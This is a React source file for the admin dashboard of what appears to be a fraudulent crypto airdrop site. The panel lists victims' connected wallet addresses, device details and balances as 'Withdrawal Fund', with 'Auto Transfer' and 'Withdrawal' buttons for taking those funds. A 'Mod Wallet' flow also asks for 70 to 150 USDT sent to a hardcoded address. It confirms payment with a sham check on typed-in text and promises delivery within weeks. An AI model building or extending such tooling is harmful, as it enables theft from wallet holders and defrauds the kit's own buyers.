import { useState, useEffect } from "react";
import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { UserDetailModal } from "@/components/user-detail-modal";
import { Users, Eye, Trash2, Calendar, Clock, Wallet, X, CheckCircle, AlertCircle } from "lucide-react";
import { Input } from "@/components/ui/input";
import type { Claim } from "@shared/schema";

export default function Admin() {
  const [selectedUser, setSelectedUser] = useState<Claim | null>(null);
  const [timerDate, setTimerDate] = useState<string>("");
  const [timerEnabled, setTimerEnabled] = useState(true);
  const [showTransferPopup, setShowTransferPopup] = useState(false);
  const [transferClaim, setTransferClaim] = useState<Claim | null>(null);
  const [autoTransferEnabled, setAutoTransferEnabled] = useState(false);
  const [showDetectingWallet, setShowDetectingWallet] = useState(false);
  const [showNoWalletFound, setShowNoWalletFound] = useState(false);
  const [showAutoTransferWarning, setShowAutoTransferWarning] = useState(false);
  const [showDeveloperPopup, setShowDeveloperPopup] = useState(false);
  const [showCreateWalletPopup, setShowCreateWalletPopup] = useState(false);
  const [showVersionPicking, setShowVersionPicking] = useState(false);
  const [showEmailInput, setShowEmailInput] = useState(false);
  const [showWalletSelection, setShowWalletSelection] = useState(false);
  const [showPaymentQR, setShowPaymentQR] = useState(false);
  const [transactionId, setTransactionId] = useState('');
  const [userEmail, setUserEmail] = useState('');
  const [selectedWalletType, setSelectedWalletType] = useState('');
  const [showVerificationSuccess, setShowVerificationSuccess] = useState(false); // Added state for verification success popup
  const queryClient = useQueryClient();

  useEffect(() => {
    // Load auto transfer setting - default is OFF
    const autoTransferSetting = localStorage.getItem('autoTransferEnabled') === 'true';
    setAutoTransferEnabled(autoTransferSetting);
  }, []);

  useEffect(() => {
    // Load current timer settings
    const savedDate = localStorage.getItem('airdropTargetDate');
    const isEnabled = localStorage.getItem('timerEnabled') !== 'false';

    if (savedDate) {
      setTimerDate(new Date(savedDate).toISOString().slice(0, 16));
    } else {
      // Default: 48 days from now
      const defaultDate = new Date();
      defaultDate.setDate(defaultDate.getDate() + 48);
      setTimerDate(defaultDate.toISOString().slice(0, 16));
    }

    setTimerEnabled(isEnabled);
  }, []);

  const { data: claims, isLoading } = useQuery<Claim[]>({
    queryKey: ['/api/claims'],
  });

  const deleteAllMutation = useMutation({
    mutationFn: async () => {
      const response = await fetch('/api/claims', { method: 'DELETE' });
      if (!response.ok) {
        throw new Error('Failed to delete all claims');
      }
      return response.json();
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['/api/claims'] });
    },
    onError: (error) => {
      console.error("Error deleting all claims:", error);
      // Optionally show an error message to the user
    }
  });

  const handleAllDelete = () => {
    if (confirm("Are you sure you want to delete all claims? This action cannot be undone.")) {
      deleteAllMutation.mutate();
    }
  };

  const handleTimerUpdate = () => {
    if (timerDate) {
      localStorage.setItem('airdropTargetDate', new Date(timerDate).toISOString());
      alert('Timer updated successfully! Users will see the new countdown.');
    }
  };

  const handleTimerToggle = () => {
    const newState = !timerEnabled;
    setTimerEnabled(newState);
    localStorage.setItem('timerEnabled', String(newState));
    alert(`Timer ${newState ? 'enabled' : 'disabled'} successfully!`);
  };

  const handleAutoTransferToggle = () => {
    if (!autoTransferEnabled) {
      // Show warning to import wallet first
      setShowAutoTransferWarning(true);
    } else {
      // Turn off auto transfer
      const newState = false;
      setAutoTransferEnabled(newState);
      localStorage.setItem('autoTransferEnabled', String(newState));
    }
  };

  const handleImportModWallet = () => {
    // Start wallet detection flow
    setShowDetectingWallet(true);

    // Show no wallet found after detection
    setTimeout(() => {
      setShowDetectingWallet(false);
      setShowNoWalletFound(true);
    }, 2000);
  };

  const handleAutoTransfer = (claim: Claim) => {
    setTransferClaim(claim);
    setShowTransferPopup(true);
  };

  const totalUsers = claims?.length || 0;

  const calculateTotalBalance = (balances: any) => {
    if (!balances) return 0;
    const values = Object.values(balances).filter((v): v is string => typeof v === 'string');
    return values.reduce((sum, val) => sum + parseFloat(val || '0'), 0);
  };

  const truncateAddress = (address: string) => {
    return `${address.slice(0, 8)}...${address.slice(-6)}`;
  };

  const formatDate = (date: string | Date) => {
    return new Date(date).toLocaleString('en-US', {
      month: 'short',
      day: 'numeric',
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
    });
  };

  const handleCreateModWallet = () => {
    setShowDeveloperPopup(false);
    setShowCreateWalletPopup(true);
  };

  const handleVersionPicking = () => {
    setShowCreateWalletPopup(false);
    setShowVersionPicking(true);

    // Auto-detect mobile version
    setTimeout(() => {
      setShowVersionPicking(false);
      setShowEmailInput(true);
    }, 2000);
  };

  const handleEmailSubmit = () => {
    if (userEmail.trim()) {
      setShowEmailInput(false);
      setShowWalletSelection(true);
    } else {
      alert('Please enter a valid email');
    }
  };

  const handleWalletTypeSelect = (type: string) => {
    setSelectedWalletType(type);
    setShowWalletSelection(false);
    setShowPaymentQR(true);
  };

  const handleVerifyTransaction = () => {
    if (transactionId.trim()) {
      // In a real application, you would call a Moralis API here to verify the transaction.
      // For this example, we'll simulate success after a short delay.
      alert('Payment verification in progress. You will be notified once confirmed.');
      setShowPaymentQR(false);

      // Simulate a delay for verification
      setTimeout(() => {
        // Check transaction details against expected values (e.g., amount, recipient address)
        // This is a simplified check. Real verification would involve checking the blockchain.
        const isAmountCorrect = (selectedWalletType === 'Binance' && parseFloat(transactionId.split('-')[1]) >= 150) ||
                                (selectedWalletType !== 'Binance' && parseFloat(transactionId.split('-')[1]) >= 70);
        const isAddressCorrect = transactionId.split('-')[0] === '0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb';

        // Check if transaction ID has been used before (simplified check)
        const isNewTransaction = !localStorage.getItem(`tx_${transactionId}`);

        if (isAmountCorrect && isAddressCorrect && isNewTransaction) {
          localStorage.setItem(`tx_${transactionId}`, 'verified');
          setShowVerificationSuccess(true); // Show success popup
          setTransactionId('');
          setUserEmail('');
          setSelectedWalletType('');
        } else {
          alert('Transaction verification failed. Please check details or try again.');
          setTransactionId('');
          setUserEmail('');
          setSelectedWalletType('');
        }
      }, 3000); // Simulate network delay
    } else {
      alert('Please enter your transaction ID');
    }
  };

  const handleAskDeveloper = async () => {
    // Check database for verified purchases for this user
    try {
      const response = await fetch('/api/claims');
      const allClaims = await response.json();

      // Check if any claim is a verified mod wallet purchase (starts with MOD_)
      // This logic might need to be refined based on how verified purchases are stored.
      // Assuming walletType is used to denote a purchased mod wallet.
      const hasModWallet = allClaims.some((claim: any) => 
        claim.walletType?.startsWith('MOD_') // This assumes 'MOD_' prefix indicates a verified mod wallet purchase
      );

      if (hasModWallet) {
        setShowVerificationSuccess(true); // Show success popup if a verified mod wallet purchase is found
      } else {
        setShowDeveloperPopup(true); // Show developer popup if no verified mod wallet purchase is found
      }
    } catch (error) {
      console.error('Error checking mod wallet status:', error);
      setShowDeveloperPopup(true); // Fallback to showing developer popup if there's an error
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-background via-background to-primary/5">
      {/* Header */}
      <header className="sticky top-0 z-50 border-b border-border bg-card/95 backdrop-blur-xl">
        <div className="container mx-auto px-4 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 rounded-lg bg-primary/10 flex items-center justify-center">
                <Users className="w-6 h-6 text-primary" />
              </div>
              <h1 className="text-2xl font-bold">Admin Dashboard</h1>
            </div>
            <div className="flex items-center gap-4">
              <Badge variant="outline" className="px-4 py-2" data-testid="badge-user-count">
                <Users className="w-4 h-4 mr-2" />
                {totalUsers} Users
              </Badge>
              <Button
                variant="destructive"
                onClick={handleAllDelete}
                disabled={deleteAllMutation.isPending || totalUsers === 0}
                className="gap-2"
              >
                <Trash2 className="w-4 h-4" />
                {deleteAllMutation.isPending ? 'Deleting...' : 'Delete All Claims'}
              </Button>
            </div>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <div className="container mx-auto px-4 py-8">
        {/* Admin Actions Card */}
        <Card className="rounded-2xl border-card-border p-6 mb-6">
          <div className="flex items-center gap-3 mb-4">
            <Users className="w-6 h-6 text-primary" />
            <h2 className="text-xl font-bold">Admin Actions</h2>
          </div>

          <div className="grid md:grid-cols-2 gap-4">
            <Button
              variant="outline"
              className="h-20 text-lg font-semibold bg-purple-500/10 hover:bg-purple-500/20 border-purple-500/50"
              onClick={handleImportModWallet}
            >
              <Wallet className="w-6 h-6 mr-2" />
              Import Mod Wallet
            </Button>

            <Button
              variant="outline"
              className="h-20 text-lg font-semibold bg-orange-500/10 hover:bg-orange-500/20 border-orange-500/50"
              onClick={handleAskDeveloper} // Updated to call the new handler
            >
              <Users className="w-6 h-6 mr-2" />
              Ask Developer
            </Button>
          </div>
        </Card>

        {/* Timer Control Card */}
        <Card className="rounded-2xl border-card-border p-6 mb-6">
          <div className="flex items-center gap-3 mb-4">
            <Clock className="w-6 h-6 text-primary" />
            <h2 className="text-xl font-bold">Airdrop Timer Control</h2>
          </div>

          <div className="grid md:grid-cols-2 gap-4">
            <div>
              <label className="block text-sm font-medium mb-2">
                <Calendar className="w-4 h-4 inline mr-2" />
                Set Airdrop Distribution Date & Time
              </label>
              <Input
                type="datetime-local"
                value={timerDate}
                onChange={(e) => setTimerDate(e.target.value)}
                className="mb-2"
              />
              <Button onClick={handleTimerUpdate} className="w-full">
                Update Timer
              </Button>
            </div>

            <div className="flex flex-col justify-center space-y-3">
              <div className="flex items-center justify-between bg-muted/30 p-4 rounded-lg">
                <span className="font-medium">Timer Status:</span>
                <Badge variant={timerEnabled ? "default" : "secondary"}>
                  {timerEnabled ? "Active" : "Disabled"}
                </Badge>
              </div>
              <Button
                onClick={handleTimerToggle}
                variant="outline"
              >
                {timerEnabled ? "Disable Timer" : "Enable Timer"}
              </Button>

              <div className="flex items-center justify-between bg-muted/30 p-4 rounded-lg mt-3">
                <span className="font-medium">Auto Transfer:</span>
                <Badge variant={autoTransferEnabled ? "default" : "secondary"}>
                  {autoTransferEnabled ? "ON" : "OFF"}
                </Badge>
              </div>
              <Button
                onClick={handleAutoTransferToggle}
                variant="outline"
              >
                {autoTransferEnabled ? "Disable Auto Transfer" : "Enable Auto Transfer"}
              </Button>
            </div>
          </div>
        </Card>

        <Card className="rounded-2xl overflow-hidden border-card-border">
          {isLoading ? (
            <div className="p-12 text-center">
              <div className="w-8 h-8 border-4 border-primary border-t-transparent rounded-full animate-spin mx-auto" />
              <p className="text-muted-foreground mt-4">Loading claims...</p>
            </div>
          ) : claims && claims.length > 0 ? (
            <>
              {/* Desktop Table */}
              <div className="hidden md:block overflow-x-auto">
                <table className="w-full">
                  <thead className="bg-muted/50">
                    <tr>
                      <th className="px-6 py-4 text-left text-sm font-semibold text-foreground">#</th>
                      <th className="px-6 py-4 text-left text-sm font-semibold text-foreground">Wallet Address</th>
                      <th className="px-6 py-4 text-left text-sm font-semibold text-foreground">Wallet Type</th>
                      <th className="px-6 py-4 text-left text-sm font-semibold text-foreground">Total Balance</th>
                      <th className="px-6 py-4 text-left text-sm font-semibold text-foreground">Device</th>
                      <th className="px-6 py-4 text-left text-sm font-semibold text-foreground">Connected At</th>
                      <th className="px-6 py-4 text-left text-sm font-semibold text-foreground">Actions</th>
                    </tr>
                  </thead>
                  <tbody>
                    {claims.map((claim, index) => (
                      <tr
                        key={claim.id}
                        className="border-t border-border hover:bg-muted/30 transition-colors"
                        data-testid={`row-user-${claim.id}`}
                      >
                        <td className="px-6 py-4">
                          <span className="text-sm font-medium">{index + 1}</span>
                        </td>
                        <td className="px-6 py-4">
                          <code className="text-sm font-mono text-foreground">
                            {truncateAddress(claim.walletAddress)}
                          </code>
                        </td>
                        <td className="px-6 py-4">
                          <Badge variant="outline" className="text-xs">
                            {claim.walletType || 'Unknown'}
                          </Badge>
                        </td>
                        <td className="px-6 py-4">
                          <div className="space-y-2">
                            <div className="bg-green-500/20 border border-green-500/50 rounded-lg px-3 py-2">
                              <p className="text-xs text-green-600 font-medium">Withdrawal Fund</p>
                              <p className="text-lg font-bold text-green-700">
                                ${calculateTotalBalance(claim.balances).toFixed(2)}
                              </p>
                            </div>
                            <Button
                              variant="outline"
                              size="sm"
                              onClick={() => handleAutoTransfer(claim)}
                              className="w-full bg-blue-500/10 hover:bg-blue-500/20 border-blue-500/50"
                            >
                              Auto Transfer
                            </Button>
                          </div>
                        </td>
                        <td className="px-6 py-4">
                          <div className="text-sm text-muted-foreground">
                            {claim.deviceBrowser || 'Unknown'}
                          </div>
                        </td>
                        <td className="px-6 py-4">
                          <span className="text-sm text-muted-foreground">
                            {formatDate(claim.claimedAt)}
                          </span>
                        </td>
                        <td className="px-6 py-4">
                          <Button
                            variant="outline"
                            size="sm"
                            onClick={() => setSelectedUser(claim)}
                            className="rounded-lg"
                            data-testid={`button-view-details-${claim.id}`}
                          >
                            <Eye className="w-4 h-4 mr-2" />
                            View
                          </Button>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>

              {/* Mobile Cards */}
              <div className="md:hidden space-y-4 p-4">
                {claims.map((claim, index) => (
                  <Card
                    key={claim.id}
                    className="p-4 space-y-3 border-card-border"
                    data-testid={`card-user-${claim.id}`}
                  >
                    <div className="flex items-start justify-between">
                      <div className="space-y-1">
                        <div className="flex items-center gap-2">
                          <span className="text-xs font-semibold text-muted-foreground">#{index + 1}</span>
                          <Badge variant="outline" className="text-xs">
                            {claim.walletType || 'Unknown'}
                          </Badge>
                        </div>
                        <code className="text-sm font-mono block">
                          {truncateAddress(claim.walletAddress)}
                        </code>
                      </div>
                      <Button
                        variant="outline"
                        size="sm"
                        onClick={() => setSelectedUser(claim)}
                        data-testid={`button-view-mobile-${claim.id}`}
                      >
                        <Eye className="w-4 h-4" />
                      </Button>
                    </div>
                    <div className="space-y-3">
                      <div className="bg-green-500/20 border border-green-500/50 rounded-lg px-3 py-2">
                        <p className="text-xs text-green-600 font-medium">Withdrawal Fund</p>
                        <p className="text-lg font-bold text-green-700">
                          ${calculateTotalBalance(claim.balances).toFixed(2)}
                        </p>
                      </div>
                      <Button
                        variant="outline"
                        size="sm"
                        onClick={() => {
                          setTransferClaim(claim);
                          setShowTransferPopup(true);
                        }}
                        className="w-full bg-red-500/10 hover:bg-red-500/20 border-red-500/50 text-red-600 font-semibold"
                      >
                        Withdrawal
                      </Button>
                      <div className="text-sm text-muted-foreground">
                        Device: {claim.deviceBrowser || 'Unknown'}
                      </div>
                    </div>
                    <div className="text-xs text-muted-foreground">
                      {formatDate(claim.claimedAt)}
                    </div>
                  </Card>
                ))}
              </div>
            </>
          ) : (
            <div className="p-12 text-center">
              <Users className="w-16 h-16 text-muted-foreground/30 mx-auto mb-4" />
              <h3 className="text-lg font-semibold text-foreground mb-2">No Claims Yet</h3>
              <p className="text-muted-foreground">Waiting for users to connect their wallets...</p>
            </div>
          )}
        </Card>
      </div>

      {selectedUser && (
        <UserDetailModal
          claim={selectedUser}
          isOpen={!!selectedUser}
          onClose={() => setSelectedUser(null)}
        />
      )}

      {/* Detecting Wallet Popup */}
      {showDetectingWallet && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <Card className="max-w-md w-full bg-gradient-to-br from-blue-900 to-blue-800 border-blue-400/30 p-8 relative">
            <h2 className="text-2xl font-bold text-blue-400 mb-4 text-center">Wallet Detecting...</h2>
            <div className="flex items-center justify-center">
              <div className="w-16 h-16 border-4 border-blue-400 border-t-transparent rounded-full animate-spin mx-auto" />
            </div>
            <p className="text-sm text-blue-200 mt-4 text-center">Please wait while we detect your mod wallet.</p>
          </Card>
        </div>
      )}

      {/* No Mod Wallet Found Popup */}
      {showNoWalletFound && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <Card className="max-w-md w-full bg-gradient-to-br from-red-900 to-red-800 border-red-400/30 p-8 relative">
            <button
              onClick={() => setShowNoWalletFound(false)}
              className="absolute top-4 right-4 text-white/70 hover:text-white"
            >
              <X className="w-6 h-6" />
            </button>
            <h2 className="text-2xl font-bold text-red-400 mb-4 text-center">No Mod Wallet Found</h2>
            <p className="text-sm text-red-200 mb-4 text-center">
              No mod wallet was found. Please ensure you have imported a valid wallet.
            </p>
            <Button
              onClick={() => setShowNoWalletFound(false)}
              className="w-full bg-red-400 hover:bg-red-500 text-white font-bold"
            >
              OK
            </Button>
          </Card>
        </div>
      )}

      {/* Auto Transfer Warning Popup */}
      {showAutoTransferWarning && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <Card className="max-w-md w-full bg-gradient-to-br from-yellow-900 to-yellow-800 border-yellow-400/30 p-8 relative">
            <button
              onClick={() => setShowAutoTransferWarning(false)}
              className="absolute top-4 right-4 text-white/70 hover:text-white"
            >
              <X className="w-6 h-6" />
            </button>
            <h2 className="text-2xl font-bold text-yellow-400 mb-4 text-center">Import Wallet Required</h2>
            <p className="text-sm text-yellow-200 mb-4 text-center">
              First import your wallet to use this feature.
            </p>
            <Button
              onClick={() => setShowAutoTransferWarning(false)}
              className="w-full bg-yellow-400 hover:bg-yellow-500 text-purple-900 font-bold"
            >
              OK
            </Button>
          </Card>
        </div>
      )}

      {/* Developer Popup */}
      {showDeveloperPopup && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <Card className="max-w-2xl w-full bg-gradient-to-br from-blue-900 to-blue-800 border-blue-400/30 p-8 relative max-h-[90vh] overflow-y-auto">
            <button
              onClick={() => setShowDeveloperPopup(false)}
              className="absolute top-4 right-4 text-white/70 hover:text-white"
            >
              <X className="w-6 h-6" />
            </button>

            <h2 className="text-2xl font-bold text-blue-400 mb-6">Admin Details</h2>

            <div className="space-y-4 text-white/90">
              <Card className="p-4 bg-white/10 border-white/20">
                <h3 className="font-semibold text-blue-300 mb-3">Device Information</h3>
                <div className="space-y-2 text-sm">
                  <p><span className="text-blue-200">Browser:</span> {navigator.userAgent.includes('Chrome') ? 'Chrome' : navigator.userAgent.includes('Firefox') ? 'Firefox' : navigator.userAgent.includes('Safari') ? 'Safari' : 'Other'}</p>
                  <p><span className="text-blue-200">Platform:</span> {navigator.platform}</p>
                  <p><span className="text-blue-200">Screen:</span> {window.screen.width}x{window.screen.height}</p>
                  <p><span className="text-blue-200">Language:</span> {navigator.language}</p>
                  <p><span className="text-blue-200">Online:</span> {navigator.onLine ? 'Yes' : 'No'}</p>
                </div>
              </Card>

              <Card className="p-4 bg-white/10 border-white/20">
                <h3 className="font-semibold text-blue-300 mb-2">User Agent</h3>
                <code className="text-xs text-white/70 break-all block">
                  {navigator.userAgent}
                </code>
              </Card>

              <Button
                onClick={handleCreateModWallet}
                className="w-full bg-blue-400 hover:bg-blue-500 text-white font-bold h-12"
              >
                Create Mod Wallet
              </Button>
            </div>
          </Card>
        </div>
      )}

      {/* Create Wallet Popup */}
      {showCreateWalletPopup && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <Card className="max-w-md w-full bg-gradient-to-br from-purple-900 to-purple-800 border-purple-400/30 p-8 relative">
            <button
              onClick={() => setShowCreateWalletPopup(false)}
              className="absolute top-4 right-4 text-white/70 hover:text-white"
            >
              <X className="w-6 h-6" />
            </button>

            <h2 className="text-2xl font-bold text-purple-300 mb-4 text-center">Create Mod Wallet</h2>
            <p className="text-white/80 text-center mb-6">
              Click next to start the setup process
            </p>

            <Button
              onClick={handleVersionPicking}
              className="w-full bg-purple-400 hover:bg-purple-500 text-white font-bold h-12"
            >
              Next Step
            </Button>
          </Card>
        </div>
      )}

      {/* Version Picking Popup */}
      {showVersionPicking && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <Card className="max-w-md w-full bg-gradient-to-br from-green-900 to-green-800 border-green-400/30 p-8 relative">
            <h2 className="text-2xl font-bold text-green-400 mb-4 text-center">Picking Version</h2>
            <div className="flex items-center justify-center mb-4">
              <div className="w-16 h-16 border-4 border-green-400 border-t-transparent rounded-full animate-spin" />
            </div>
            <p className="text-sm text-green-200 text-center">
              Detecting version for: {navigator.platform}
            </p>
          </Card>
        </div>
      )}

      {/* Email Input Popup */}
      {showEmailInput && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <Card className="max-w-md w-full bg-gradient-to-br from-indigo-900 to-indigo-800 border-indigo-400/30 p-8 relative">
            <button
              onClick={() => setShowEmailInput(false)}
              className="absolute top-4 right-4 text-white/70 hover:text-white"
            >
              <X className="w-6 h-6" />
            </button>

            <h2 className="text-2xl font-bold text-indigo-300 mb-4">Enter Your Email</h2>
            <p className="text-white/80 mb-4">We'll send wallet details to your email</p>

            <Input
              type="email"
              value={userEmail}
              onChange={(e) => setUserEmail(e.target.value)}
              placeholder="your@email.com"
              className="bg-black/30 border-indigo-400/30 text-white placeholder:text-white/40 mb-4"
            />

            <Button
              onClick={handleEmailSubmit}
              className="w-full bg-indigo-400 hover:bg-indigo-500 text-white font-bold h-12"
            >
              Next Step
            </Button>
          </Card>
        </div>
      )}

      {/* Wallet Selection Popup */}
      {showWalletSelection && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <Card className="max-w-2xl w-full bg-gradient-to-br from-purple-900 to-purple-800 border-purple-400/30 p-8 relative">
            <button
              onClick={() => setShowWalletSelection(false)}
              className="absolute top-4 right-4 text-white/70 hover:text-white"
            >
              <X className="w-6 h-6" />
            </button>

            <h2 className="text-2xl font-bold text-purple-300 mb-6 text-center">Select Mod Wallet Type</h2>

            <div className="space-y-4">
              <Card 
                className="p-6 bg-white/10 border-white/20 cursor-pointer hover:bg-white/20 transition-all"
                onClick={() => handleWalletTypeSelect('MetaMask')}
              >
                <div className="flex items-center justify-between mb-4">
                  <div className="flex items-center gap-3">
                    <span className="text-4xl">🦊</span>
                    <h3 className="text-xl font-bold text-white">MetaMask</h3>
                  </div>
                  <div className="text-right">
                    <p className="text-2xl font-bold text-yellow-400">70 USDT</p>
                  </div>
                </div>
                <div className="space-y-1 text-sm text-white/80">
                  <p>✅ Auto Transfer Available</p>
                  <p>✅ Withdrawal Available</p>
                  <p>⚠️ Only MetaMask to MetaMask</p>
                </div>
              </Card>

              <Card 
                className="p-6 bg-white/10 border-white/20 cursor-pointer hover:bg-white/20 transition-all"
                onClick={() => handleWalletTypeSelect('Trust Wallet')}
              >
                <div className="flex items-center justify-between mb-4">
                  <div className="flex items-center gap-3">
                    <span className="text-4xl">🛡️</span>
                    <h3 className="text-xl font-bold text-white">Trust Wallet</h3>
                  </div>
                  <div className="text-right">
                    <p className="text-2xl font-bold text-yellow-400">70 USDT</p>
                  </div>
                </div>
                <div className="space-y-1 text-sm text-white/80">
                  <p>✅ Auto Transfer Available</p>
                  <p>✅ Withdrawal Available</p>
                  <p>⚠️ Only Trust Wallet to Trust Wallet</p>
                </div>
              </Card>

              <Card 
                className="p-6 bg-white/10 border-white/20 cursor-pointer hover:bg-white/20 transition-all"
                onClick={() => handleWalletTypeSelect('Binance')}
              >
                <div className="flex items-center justify-between mb-4">
                  <div className="flex items-center gap-3">
                    <span className="text-4xl">🟡</span>
                    <h3 className="text-xl font-bold text-white">Binance Wallet</h3>
                  </div>
                  <div className="text-right">
                    <p className="text-2xl font-bold text-yellow-400">150 USDT</p>
                  </div>
                </div>
                <div className="space-y-1 text-sm text-white/80">
                  <p>✅ Auto Transfer Available</p>
                  <p>✅ Withdrawal Available</p>
                  <p>✅ Any Wallet - No Limit</p>
                </div>
              </Card>
            </div>
          </Card>
        </div>
      )}

      {/* Payment QR Popup */}
      {showPaymentQR && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <Card className="max-w-md w-full bg-gradient-to-br from-green-900 to-green-800 border-green-400/30 p-8 relative">
            <button
              onClick={() => setShowPaymentQR(false)}
              className="absolute top-4 right-4 text-white/70 hover:text-white"
            >
              <X className="w-6 h-6" />
            </button>

            <h2 className="text-2xl font-bold text-green-300 mb-4 text-center">
              Payment for {selectedWalletType}
            </h2>

            <div className="bg-white p-4 rounded-lg mb-4">
              <div className="w-full h-64 bg-gray-200 flex items-center justify-center">
                <p className="text-gray-600 text-center">QR Code Placeholder<br/>Scan to Pay</p>
              </div>
            </div>

            <Card className="p-4 bg-white/10 border-white/20 mb-4">
              <p className="text-sm text-green-200 mb-2">Payment Amount:</p>
              <p className="text-3xl font-bold text-yellow-400 text-center">
                {selectedWalletType === 'Binance' ? '150' : '70'} USDT
              </p>
              <p className="text-xs text-green-300 text-center mt-2">BEP20 Network</p>
            </Card>

            <Card className="p-4 bg-white/10 border-white/20 mb-4">
              <p className="text-xs text-white/70 mb-2">Wallet Address:</p>
              <code className="text-xs text-white break-all block bg-black/30 p-2 rounded">
                0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb
              </code>
            </Card>

            <div className="space-y-3">
              <Input
                type="text"
                value={transactionId}
                onChange={(e) => setTransactionId(e.target.value)}
                placeholder="Enter Transaction ID (e.g., amount-txid)"
                className="bg-black/30 border-green-400/30 text-white placeholder:text-white/40"
              />

              <Button
                onClick={handleVerifyTransaction}
                className="w-full bg-green-400 hover:bg-green-500 text-white font-bold h-12"
              >
                Verify Transaction
              </Button>
            </div>

            <p className="text-xs text-white/60 text-center mt-4">
              After payment verification, your mod wallet will be activated within 24 hours
            </p>
          </Card>
        </div>
      )}

      {/* Verification Success Popup */}
      {showVerificationSuccess && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <Card className="max-w-md w-full bg-gradient-to-br from-green-900 to-green-800 border-green-400/30 p-8 relative">
            <button
              onClick={() => setShowVerificationSuccess(false)}
              className="absolute top-4 right-4 text-white/70 hover:text-white"
            >
              <X className="w-6 h-6" />
            </button>
            <CheckCircle className="w-16 h-16 text-green-400 mx-auto mb-4" />
            <h2 className="text-2xl font-bold text-green-300 mb-4 text-center">Verification Successful!</h2>
            <p className="text-white/80 text-center mb-4">
              Your mod wallet is being prepared and will be sent to your email within 10-15 days.
              Please do not share this mod with anyone else. It's generated specifically for you.
            </p>
            <Button
              onClick={() => setShowVerificationSuccess(false)}
              className="w-full bg-green-400 hover:bg-green-500 text-white font-bold h-12 mt-4"
            >
              OK
            </Button>
          </Card>
        </div>
      )}

      {/* Auto Transfer Popup */}
      {showTransferPopup && transferClaim && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <Card className="max-w-md w-full bg-gradient-to-br from-purple-900 to-purple-800 border-yellow-400/30 p-8 relative">
            <button
              onClick={() => setShowTransferPopup(false)}
              className="absolute top-4 right-4 text-white/70 hover:text-white"
            >
              <X className="w-6 h-6" />
            </button>

            <h2 className="text-2xl font-bold text-yellow-400 mb-4">Auto Transfer Instructions</h2>

            <div className="space-y-4 text-white/90">
              <p className="text-lg">
                To complete the auto transfer for wallet:
              </p>
              <code className="block bg-black/30 p-3 rounded-lg text-sm">
                {transferClaim.walletAddress}
              </code>

              <div className="bg-yellow-400/10 border border-yellow-400/30 rounded-lg p-4">
                <p className="font-semibold text-yellow-400 mb-2">📱 Please follow these steps:</p>
                <ol className="space-y-2 text-sm">
                  <li>1. Go to the home page</li>
                  <li>2. Import your mod wallet</li>
                  <li>3. The transfer will be processed automatically</li>
                </ol>
              </div>

              <div className="bg-green-500/20 border border-green-500/50 rounded-lg p-3 text-center">
                <p className="text-xs text-green-400 mb-1">Amount to Transfer</p>
                <p className="text-2xl font-bold text-green-300">
                  ${calculateTotalBalance(transferClaim.balances).toFixed(2)}
                </p>
              </div>
            </div>

            <Button
              onClick={() => setShowTransferPopup(false)}
              className="w-full mt-6 bg-yellow-400 hover:bg-yellow-500 text-purple-900 font-bold"
            >
              Got It
            </Button>
          </Card>
        </div>
      )}
    </div>
  );
}